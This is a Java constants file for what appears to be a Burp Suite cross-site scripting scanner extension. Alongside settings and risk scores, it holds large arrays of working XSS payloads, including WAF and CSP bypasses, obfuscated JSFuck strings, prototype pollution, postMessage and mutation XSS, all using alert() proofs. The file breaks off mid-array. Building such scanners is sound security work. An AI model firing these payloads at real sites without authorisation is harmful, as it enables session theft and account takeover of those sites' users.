package burp;

/**
 * Clean, professional constants for XSSDetector
 * Removes excessive junk code and focuses on essential constants
 */
public class Constants {
    
    // Core constants
    public static final String NAME = "name";
    public static final String VALUE = "value";
    public static final String TYPE = "type";
    public static final String VALUE_START = "valueStart";
    public static final String VALUE_END = "valueEnd";
    public static final String MATCHES = "matches";
    public static final String REFLECTED_IN = "ReflectedIn";
    public static final String VULNERABLE = "Vulnerable";
    public static final String CONTEXT_VULN_FLAG = " <b>VULNERABLE</b>";
    
    // Core settings
    public static final String SCOPE_ONLY = "Scope only";
    public static final String CHECK_CONTEXT = "Check context";
    public static final String AGGRESSIVE_MODE = "Aggressive mode";
    
    // Content types
    public static final String HEADERS = "HEADERS";
    public static final String BODY = "BODY";
    public static final String BOTH = "ALL";
    
    // Context types
    public static final String CONTEXT_OUT_OF_TAG = "HTML: <";
    public static final String CONTEXT_IN_ATTRIBUTE_Q = "Attribute: '";
    public static final String CONTEXT_IN_ATTRIBUTE_DQ = "Attribute: \"";
    public static final String CONTEXT_IN_TAG = "In tag";
    public static final String CONTEXT_IN_SCRIPT_TAG_STRING_Q = "Script str: '";
    public static final String CONTEXT_IN_SCRIPT_TAG_STRING_DQ = "Script str: \"";
    public static final String CONTEXT_IN_SCRIPT_TAG = "Script";
    
    // Modern parameter types
    public static final String PARAM_GRAPHQL = "GRAPHQL";
    public static final String PARAM_JWT = "JWT";
    public static final String PARAM_WEBSOCKET = "WEBSOCKET";
    public static final String PARAM_API_KEY = "API_KEY";
    public static final String PARAM_MULTIPART = "MULTIPART";
    
    // Modern contexts
    public static final String CONTEXT_GRAPHQL_QUERY = "GraphQL: ";
    public static final String CONTEXT_JWT_CLAIM = "JWT: ";
    public static final String CONTEXT_SPA_TEMPLATE = "SPA: ";
    public static final String CONTEXT_CSS_INJECTION = "CSS: ";
    public static final String CONTEXT_SVG_INJECTION = "SVG: ";
    public static final String CONTEXT_ANGULAR = "Angular: ";
    public static final String CONTEXT_REACT = "React: ";
    public static final String CONTEXT_VUE = "Vue: ";
    
    // Modern settings
    public static final String MODERN_DETECTION = "Modern Detection";
    public static final String DOM_XSS_DETECTION = "DOM XSS Detection";
    public static final String CSP_ANALYSIS = "CSP Analysis";
    public static final String SESSION_HANDLING = "Session Handling";
    public static final String ADVANCED_FILTERING = "Advanced Filtering";
    
    // False positive reduction
    public static final String FALSE_POSITIVE_REDUCTION = "False Positive Reduction";
    public static final String SMART_FILTERING = "Smart Filtering";
    public static final String CONTEXT_AWARE_FILTERING = "Context Aware Filtering";
    public static final String MINIMUM_PAYLOAD_LENGTH = "Minimum Payload Length";
    public static final String EXCLUDE_COMMON_WORDS = "Exclude Common Words";
    public static final String CONFIDENCE_SCORING = "Confidence Scoring";
    
    // Session handling constants
    public static final String SESSION_TOKEN_TRACKING = "Session Token Tracking";
    public static final String AUTO_SESSION_HANDLING = "Auto Session Handling";
    public static final String CSRF_TOKEN_HANDLING = "CSRF Token Handling";
    public static final String SESSION_VALIDATION = "Session Validation";
    
    // Detection patterns
    public static final String[] GRAPHQL_INDICATORS = {"query", "mutation", "subscription", "fragment", "__schema", "__type"};
    public static final String[] SPA_INDICATORS = {"ng-app", "react", "vue", "{{", "}}", "v-", "ng-", "*ng", "className="};
    public static final String[] TEMPLATE_INDICATORS = {"{{", "}}", "<%", "%>", "${", "}", "[[", "]]"};
    public static final String[] DOM_SOURCES = {"location.href", "location.search", "location.hash", "document.referrer", "window.name", "postMessage"};
    public static final String[] DOM_SINKS = {"innerHTML", "outerHTML", "document.write", "eval", "setTimeout", "setInterval", "Function"};
    
    // False positive patterns
    public static final String[] FALSE_POSITIVE_PATTERNS = {
        "test", "example", "sample", "demo", "placeholder", "default", "null", "undefined",
        "true", "false", "yes", "no", "on", "off", "1", "0", "admin", "user", "guest"
    };
    
    // Session token patterns
    public static final String[] SESSION_PATTERNS = {
        "JSESSIONID", "PHPSESSID", "ASPSESSIONID", "session", "sessid", "sid", "token",
        "csrf", "xsrf", "_token", "authenticity_token", "csrfmiddlewaretoken"
    };
    
    // Content types
    public static final String[] VALID_CONTENT_TYPES = {
        "text/html", "application/json", "application/xml", "text/xml", "application/javascript",
        "text/javascript", "application/xhtml+xml", "text/plain", "application/x-www-form-urlencoded",
        "multipart/form-data", "application/graphql"
    };
    
    // Confidence thresholds
    public static final int MIN_CONFIDENCE_LOW = 30;
    public static final int MIN_CONFIDENCE_MEDIUM = 60;
    public static final int MIN_CONFIDENCE_HIGH = 80;
    
    // Payload length thresholds
    public static final int MIN_PAYLOAD_LENGTH = 3;
    public static final int MAX_PAYLOAD_LENGTH = 1000;
    public static final int SUSPICIOUS_PAYLOAD_LENGTH = 100;
    
    // Malicious symbols/characters for initial reflection testing (Stage 1)
    // These are tested first to identify vulnerable parameters before injecting full payloads
    public static final String[] MALICIOUS_SYMBOLS = {
        "<", ">", "\"", "'", "`", 
        "&", ";", "=", "(", ")", 
        "[", "]", "{", "}", "/", 
        "\\", "|", "!", "@", "#", 
        "$", "%", "^", "*", "+",
        ":", "?", "~", "-", "_"
    };
    
    // Critical XSS-inducing character combinations
    public static final String[] XSS_INDICATOR_COMBINATIONS = {
        "<>", "<script", "</script>", "javascript:", 
        "onerror=", "onload=", "onclick=", "onmouseover=",
        "alert(", "eval(", "document.cookie", "innerHTML",
        "document.write", "String.fromCharCode", "\\u003c", "\\u003e",
        "&lt;", "&gt;", "&#60;", "&#62;", "%3C", "%3E"
    };
    
    // Core XSS Payloads - Essential and Professional
    public static final String[] CORE_XSS_PAYLOADS = {
        // Basic HTML context
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        
        // Attribute context
        "' onmouseover='alert(`XSS`)'",
        "\" onload=\"alert('XSS')\"",
        "' autofocus onfocus='alert(`XSS`)'",
        
        // JavaScript context
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "';eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41));//",
        
        // URL context
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        
        // Modern frameworks
        "{{constructor.constructor('alert(1)')()}}",
        "${alert('XSS')}",
        "#{alert('XSS')}",
        
        // WAF bypass techniques
        "<sCrIpT>alert('XSS')</ScRiPt>",
        "<script>al\\u0065rt('XSS')</script>",
        "<script>window['al'+'ert']('XSS')</script>",
        
        // Event handler variations
        "<img/src=x onerror=alert('XSS')>",
        "<img src=x:alert('XSS')>",
        
        // CSS injection
        "<style>@import'javascript:alert(\"XSS\")';</style>",
        "<div style=\"background:url('javascript:alert(\\\"XSS\\\")')\">",
        
        // Polyglot payloads
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "'\"><img/src/onerror=alert('XSS')>"
    };
    
    // Context-specific payloads
    public static final String[] HTML_CONTEXT_PAYLOADS = {
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>"
    };
    
    public static final String[] ATTRIBUTE_CONTEXT_PAYLOADS = {
        "' onmouseover='alert(`XSS`)'",
        "\" onload=\"alert('XSS')\"",
        "' autofocus onfocus='alert(`XSS`)'"
    };
    
    public static final String[] JAVASCRIPT_CONTEXT_PAYLOADS = {
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "';eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41));//"
    };
    
    public static final String[] WAF_BYPASS_PAYLOADS = {
        "<sCrIpT>alert('XSS')</ScRiPt>",
        "<script>al\\u0065rt('XSS')</script>",
        "<script>window['al'+'ert']('XSS')</script>",
        "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29')</script>"
    };
    
    public static final String[] FRAMEWORK_SPECIFIC_PAYLOADS = {
        "{{constructor.constructor('alert(1)')()}}",
        "${alert('XSS')}",
        "#{alert('XSS')}",
        "<%=alert('XSS')%>",
        "{{7*7}}{{alert('XSS')}}",
        "${7*7}${alert('XSS')}",
        "`<img src=x onerror=alert(1)>`",
        "${String.fromCharCode(88,83,83)}",
        "<img id=x name=y src=x onerror=alert(1)>",
        "<a id=location href=javascript:alert(1)>click</a>"
    };
    
    public static final String[] CSP_BYPASS_PAYLOADS = {
        "<script>eval('alert(\"XSS\")')</script>",
        "<script>import('data:text/javascript,alert(\"XSS\")')</script>",
        "<script>new Function('alert(\"XSS\")')();</script>"
    };
    
    public static final String[] DOM_XSS_PAYLOADS = {
        "';document.location='javascript:alert(\"XSS\")';//",
        "';window.location.href='javascript:alert(\"XSS\")';//",
        "';eval(atob('YWxlcnQoJ1hTUycp'));//"
    };
    
    // Severity levels
    public static final String SEVERITY_CRITICAL = "CRITICAL";
    public static final String SEVERITY_HIGH = "HIGH";
    public static final String SEVERITY_MEDIUM = "MEDIUM";
    public static final String SEVERITY_LOW = "LOW";
    public static final String SEVERITY_INFO = "INFO";
    
    // Risk scores
    public static final int RISK_JAVASCRIPT_CONTEXT = 100;
    public static final int RISK_SVG_CONTEXT = 95;
    public static final int RISK_HTML_CONTEXT = 80;
    public static final int RISK_ATTRIBUTE_CONTEXT = 60;
    public static final int RISK_CSS_CONTEXT = 70;
    public static final int RISK_URL_CONTEXT = 50;
    public static final int RISK_COMMENT_CONTEXT = 20;
    
    // Content risk scores
    public static final int RISK_HTML_CONTENT = 90;
    public static final int RISK_XHTML_CONTENT = 85;
    public static final int RISK_XML_CONTENT = 70;
    public static final int RISK_SVG_CONTENT = 95;
    public static final int RISK_JS_CONTENT = 100;
    public static final int RISK_JSON_CONTENT = 60;
    public static final int RISK_PLAIN_CONTENT = 40;
    
    // Risk factors
    public static final double RISK_FACTOR_URL_PARAM = 1.0;
    public static final double RISK_FACTOR_POST_PARAM = 1.2;
    public static final double RISK_FACTOR_JSON_PARAM = 1.5;
    public static final double RISK_FACTOR_HEADER_PARAM = 0.8;
    public static final double RISK_FACTOR_COOKIE_PARAM = 0.7;
    
    // Detection types
    public static final String DETECTION_DOM_BASED = "DOM_BASED_XSS";
    public static final String DETECTION_STORED = "STORED_XSS";
    public static final String DETECTION_REFLECTED = "REFLECTED_XSS";
    public static final String DETECTION_UNIVERSAL = "UNIVERSAL_XSS";
    public static final String DETECTION_MUTATION = "MUTATION_XSS";
    
    // WAF signatures
    public static final String[] WAF_SIGNATURES = {
        "cloudflare", "akamai", "incapsula", "f5", "barracuda", "fortinet", "palo alto",
        "checkpoint", "imperva", "fastly", "aws waf", "azure waf", "google cloud armor"
    };
    
    // Filter bypass indicators
    public static final String[] FILTER_BYPASS_INDICATORS = {
        "script", "javascript", "onload", "onerror", "onmouseover", "onclick", "eval", "alert"
    };
    
    // Mutation techniques
    public static final String[] MUTATION_TECHNIQUES = {
        "case_swapping", "unicode_encoding", "hex_encoding", "url_encoding", "double_encoding",
        "html_entities", "javascript_escapes", "mixed_encoding"
    };
    
    // Exploit difficulty
    public static final String EXPLOIT_TRIVIAL = "TRIVIAL";
    public static final String EXPLOIT_EASY = "EASY";
    public static final String EXPLOIT_MODERATE = "MODERATE";
    public static final String EXPLOIT_DIFFICULT = "DIFFICULT";
    public static final String EXPLOIT_ADVANCED = "ADVANCED";
    
    // Impact levels
    public static final String IMPACT_ACCOUNT_TAKEOVER = "ACCOUNT_TAKEOVER";
    public static final String IMPACT_DATA_THEFT = "DATA_THEFT";
    public static final String IMPACT_DEFACEMENT = "DEFACEMENT";
    public static final String IMPACT_MALWARE_DISTRIBUTION = "MALWARE_DISTRIBUTION";
    public static final String IMPACT_PHISHING = "PHISHING";
    public static final String IMPACT_INFORMATION_DISCLOSURE = "INFORMATION_DISCLOSURE";
    
    // Scanner modes
    public static final String SCANNER_MODE_BASIC = "Basic Mode";
    public static final String SCANNER_MODE_ADVANCED = "Advanced Mode";
    public static final String SCANNER_MODE_PROFESSIONAL = "Professional Mode";
    public static final String SCANNER_MODE_EXPERT = "Expert Mode";
    
    // Core XSS technique settings
    public static final String ENABLE_WAF_BYPASS = "Enable WAF Bypass Techniques";
    public static final String ENABLE_FRAMEWORK_SPECIFIC = "Enable Framework-Specific Payloads";
    public static final String ENABLE_ENCODING_BYPASS = "Enable Encoding Bypass";
    public static final String ENABLE_CSP_BYPASS = "Enable CSP Bypass Techniques";
    public static final String ENABLE_POLYGLOT_PAYLOADS = "Enable Polyglot Payloads";
    public static final String ENABLE_BROWSER_SPECIFIC = "Enable Browser-Specific Payloads";
    
    // Analysis settings
    public static final String DEEP_CONTEXT_ANALYSIS = "Deep Context Analysis";
    public static final String BEHAVIORAL_ANALYSIS = "Behavioral Pattern Analysis";
    public static final String SEMANTIC_ANALYSIS = "Semantic Analysis";
    public static final String MUTATION_TESTING = "Mutation Testing";
    public static final String PAYLOAD_OPTIMIZATION = "Payload Optimization";
    
    // Response analysis
    public static final String RESPONSE_TIME_ANALYSIS = "Response Time Analysis";
    public static final String HEADER_ANALYSIS = "Security Header Analysis";
    public static final String COOKIE_ANALYSIS = "Cookie Security Analysis";
    public static final String CORS_ANALYSIS = "CORS Configuration Analysis";
    
    // Reporting settings
    public static final String DETAILED_REPORTING = "Detailed Vulnerability Reporting";
    public static final String EXPLOIT_GENERATION = "Automatic Exploit Generation";
    public static final String REMEDIATION_SUGGESTIONS = "Remediation Suggestions";
    public static final String COMPLIANCE_CHECKING = "Compliance Checking";
    public static final String VERBOSE_LOGGING = "Verbose Logging";
    
    // Performance settings
    public static final String THREAD_POOL_SIZE = "Thread Pool Size";
    public static final String REQUEST_THROTTLING = "Request Throttling";
    public static final String MEMORY_OPTIMIZATION = "Memory Optimization";
    public static final String BATCH_PROCESSING = "Batch Processing";
    
    // Default content types
    /**
     * COMPREHENSIVE: Default content types for client-side injection detection
     * Includes all old and modern content types where XSS and client-side attacks are possible
     * Organized by category: HTML, JavaScript, JSON, XML, Modern APIs, Templates, etc.
     */
    // Streamlined essential content types for XSS detection
    // Only text/html and application/json enabled by default
    // Minimal list - only essential content types where XSS is commonly found
    public static final String[] MODERN_DEFAULT_CONTENT_TYPES = {
        // HTML Content Types (Primary XSS Vector) - ENABLED BY DEFAULT
        "text/html",
        
        // JSON Content Types (JSON XSS, JSONP) - ENABLED BY DEFAULT
        "application/json"
    };
    
    // Content type risk matrix
    public static final int[][] CONTENT_TYPE_RISK_MATRIX = {
        {90, 100, 85, 70, 95, 100, 85, 40, 60, 50}, // HTML
        {60, 70, 65, 50, 75, 80, 65, 30, 50, 40},   // JSON
        {70, 80, 75, 60, 85, 90, 75, 35, 55, 45},   // XML
        {85, 95, 90, 75, 100, 100, 90, 45, 65, 55}, // JavaScript
        {40, 50, 45, 30, 55, 60, 45, 20, 30, 25},   // Plain text
        {60, 70, 65, 50, 75, 80, 65, 30, 50, 40}    // Form data
    };
    
    // Payload categories
    public static final String PAYLOAD_CATEGORY_BASIC = "Basic XSS Payloads";
    public static final String PAYLOAD_CATEGORY_ADVANCED = "Advanced XSS Payloads";
    public static final String PAYLOAD_CATEGORY_EVASION = "Evasion Techniques";
    public static final String PAYLOAD_CATEGORY_FRAMEWORK = "Framework-Specific";
    public static final String PAYLOAD_CATEGORY_BROWSER = "Browser-Specific";
    public static final String PAYLOAD_CATEGORY_ENCODING = "Encoding Bypass";
    
    // Confidence levels
    public static final String CONFIDENCE_CERTAIN = "CERTAIN";
    public static final String CONFIDENCE_FIRM = "FIRM";
    public static final String CONFIDENCE_TENTATIVE = "TENTATIVE";
    public static final String CONFIDENCE_ADVANCED = "ADVANCED";

    // Specialized payload arrays for comprehensive client-side injection coverage
    public static final String[] ADVANCED_XSS_PAYLOADS = {
        // Advanced encoding bypasses
        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
        "<svg/onload=alert`XSS`>",
        "<iframe srcdoc=<script>alert(1)</script>>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<form><button formaction=javascript:alert(1)>",
        "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
        "<link rel=import href=javascript:alert(1)>",
        "<style>@import'javascript:alert(1)';</style>",
        "<style>body{-moz-binding:url(\"data:text/xml;charset=utf-8,<?xml version='1.0'?><bindings xmlns='http://www.mozilla.org/xbl'><binding><implementation><constructor><![CDATA[alert(1)]]></constructor></implementation></binding></bindings>\")}</style>"
    };
    
    // JSFuck obfuscated payloads
    public static final String[] JSFUCKER_XSS_PAYLOADS = {
        "<script>[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()</script>",
        "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"
    };
    
    // Browser-specific payloads
    public static final String[] BROWSER_SPECIFIC_PAYLOADS = {
        // Chrome/Edge specific
        "<script>import('data:text/javascript,alert(1)')</script>",
        "<script>new Worker('data:text/javascript,self.postMessage(1);self.onmessage=e=>alert(e.data)')</script>",
        "<script>navigator.serviceWorker.register('data:text/javascript,self.onmessage=e=>eval(e.data)')</script>",
        // Firefox specific
        "<script>document.write('<script>alert(1)</script>')</script>",
        "<script>document.writeln('<script>alert(1)</script>')</script>",
        // Safari specific
        "<script>location='javascript:alert(1)'</script>",
        "<script>window.location='javascript:alert(1)'</script>",
        // Universal
        "<script>setTimeout('alert(1)',0)</script>",
        "<script>setInterval('alert(1)',1000)</script>",
        "<script>Function('alert(1)')()</script>",
        "<script>new Function('alert(1)')()</script>"
    };
    
    // Prototype Pollution XSS payloads
    public static final String[] PROTOTYPE_POLLUTION_XSS = {
        "{\"__proto__\":{\"isAdmin\":true}}",
        "{\"__proto__\":{\"innerHTML\":\"<script>alert(1)</script>\"}}",
        "{\"__proto__\":{\"outerHTML\":\"<script>alert(1)</script>\"}}",
        "{\"__proto__\":{\"src\":\"javascript:alert(1)\"}}",
        "{\"__proto__\":{\"onerror\":\"alert(1)\"}}",
        "{\"__proto__\":{\"onload\":\"alert(1)\"}}",
        "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
        "{\"__proto__\":{\"polluted\":\"yes\",\"toString\":\"<script>alert(1)</script>\"}}",
        "{\"__proto__\":{\"valueOf\":\"<script>alert(1)</script>\"}}",
        "{\"__proto__\":{\"hasOwnProperty\":function(){alert(1)}}}"
    };
    
    // PostMessage XSS payloads
    public static final String[] POSTMESSAGE_XSS = {
        "<script>window.postMessage('<script>alert(1)</script>','*')</script>",
        "<script>window.postMessage('javascript:alert(1)','*')</script>",
        "<script>window.postMessage('data:text/html,<script>alert(1)</script>','*')</script>",
        "<script>parent.postMessage('<script>alert(1)</script>','*')</script>",
        "<script>top.postMessage('<script>alert(1)</script>','*')</script>",
        "<script>frames[0].postMessage('<script>alert(1)</script>','*')</script>",
        "<script>window.addEventListener('message',function(e){eval(e.data)})</script>",
        "<script>window.onmessage=function(e){eval(e.data)}</script>",
        "<script>window.addEventListener('message',function(e){document.body.innerHTML=e.data})</script>",
        "<script>window.onmessage=function(e){document.body.innerHTML=e.data}</script>"
    };
    
    // Web Components XSS payloads
    public static final String[] WEB_COMPONENTS_XSS = {
        "<script>customElements.define('xss',class extends HTMLElement{connectedCallback(){alert('XSS')}})</script>",
        "<script>customElements.define('xss',class extends HTMLElement{constructor(){super();this.innerHTML='<script>alert(1)</script>'}})</script>",
        "<script>customElements.define('xss',class extends HTMLElement{attributeChangedCallback(){alert('XSS')}})</script>",
        "<xss-element></xss-element>",
        "<script>class XSSElement extends HTMLElement{connectedCallback(){this.innerHTML='<script>alert(1)</script>'}}customElements.define('xss-el',XSSElement)</script>",
        "<script>document.createElement('xss-element').innerHTML='<script>alert(1)</script>'</script>"
    };
    
    // Shadow DOM XSS payloads
    public static final String[] SHADOW_DOM_XSS = {
        "<script>document.body.attachShadow({mode:'open'}).innerHTML='<script>alert(1)</script>'</script>",
        "<script>const shadow=document.body.attachShadow({mode:'open'});shadow.innerHTML='<img src=x onerror=alert(1)>'</script>",
        "<script>const shadow=document.createElement('div').attachShadow({mode:'open'});shadow.innerHTML='<script>alert(1)</script>'</script>",
        "<script>document.body.attachShadow({mode:'closed'}).innerHTML='<script>alert(1)</script>'</script>",
        "<script>const host=document.createElement('div');const shadow=host.attachShadow({mode:'open'});shadow.innerHTML='<script>alert(1)</script>';document.body.appendChild(host)</script>"
    };
    
    // WebAssembly XSS payloads
    public static final String[] WEBASSEMBLY_XSS = {
        "<script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])).then(m=>alert('WASM'))</script>",
        "<script>fetch('data:application/wasm;base64,AGFzbQEAAAA=').then(r=>r.arrayBuffer()).then(b=>WebAssembly.instantiate(b)).then(m=>alert('WASM'))</script>"
    };
    
    // Modern Browser API XSS payloads
    public static final String[] MODERN_BROWSER_API_XSS = {
        // SharedArrayBuffer
        "<script>new SharedArrayBuffer(1024);alert('SAB')</script>",
        // BroadcastChannel
        "<script>const bc=new BroadcastChannel('xss');bc.onmessage=e=>eval(e.data);bc.postMessage('alert(1)')</script>",
        // Cache API
        "<script>caches.open('xss').then(c=>c.put(new Request('x'),new Response('<script>alert(1)</script>')))</script>",
        // Service Worker
        "<script>navigator.serviceWorker.register('data:text/javascript,self.onmessage=e=>eval(e.data)')</script>",
        // Web Worker
        "<script>new Worker('data:text/javascript,self.onmessage=e=>eval(e.data)').postMessage('alert(1)')</script>",
        // Dynamic Import
        "<script>import('data:text/javascript,alert(1)')</script>",
        // Trusted Types bypass
        "<script>trustedTypes.createPolicy('default',{createHTML:s=>s}).createHTML('<script>alert(1)</script>')</script>",
        // MutationObserver
        "<script>new MutationObserver(()=>alert('MXSS')).observe(document,{childList:true,subtree:true})</script>",
        // IntersectionObserver
        "<script>new IntersectionObserver(()=>alert('XSS')).observe(document.body)</script>",
        // ResizeObserver
        "<script>new ResizeObserver(()=>alert('XSS')).observe(document.body)</script>",
        // PerformanceObserver
        "<script>new PerformanceObserver(()=>alert('XSS')).observe({entryTypes:['measure']})</script>",
        // ReportingObserver
        "<script>new ReportingObserver(()=>alert('XSS'),{types:['deprecation']}).observe()</script>",
        // Fetch API
        "<script>fetch('data:text/html,<script>alert(1)</script>').then(r=>r.text()).then(t=>eval(t))</script>",
        // Streams API
        "<script>new ReadableStream({start(c){c.enqueue(new TextEncoder().encode('<script>alert(1)</script>'))}}).getReader().read().then(d=>alert('Stream'))</script>"
    };
    
    // Mutation XSS (mXSS) payloads
    public static final String[] MUTATION_XSS_PAYLOADS = {
        "<noscript><img src=x onerror=alert(1)></noscript>",
        "<noembed><img src=x onerror=alert(1)></noembed>",
        "<noframes><img src=x onerror=alert(1)></noframes>",
        "<title><img src=x onerror=alert(1)></title>",
        "<textarea><img src=x onerror=alert(1)></textarea>",
        "<iframe><img src=x onerror=alert(1)></iframe>",
        "<xmp><img src=x onerror=alert(1)></xmp>",
        "<plaintext><img src=x onerror=alert(1)></plaintext>",
        "<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
        "<math><mi><img src=x onerror=alert(1)></mi></math>",
        "<details><summary><img src=x onerror=alert(1)></summary></details>",
        "<form><button formaction=javascript:alert(1)>",
        "<form><input formaction=javascript:alert(1) type=submit>",
        "<form><input onfocus=alert(1) autofocus type=text>"
    };

    // Universal XSS (uXSS) payloads
    public static final String[] UNIVERSAL_XSS_PAYLOADS = {
        "<script>frames[0].location='javascript:alert(1)'</script>",
        "<script>parent.frames[0].location='javascript:alert(1)'</script>",
        "<script>top.frames[0].location='javascript:alert(1)'</script>",
        "<script>window.frames[0].location='javascript:alert(1)'</script>",
        "<script>document.getElementsByTagName('iframe')[0].src='javascript:alert(1)'</script>",
        "<script>document.querySelector('iframe').src='javascript:alert(1)'</script>",
        "<iframe src='javascript:alert(1)'></iframe>",
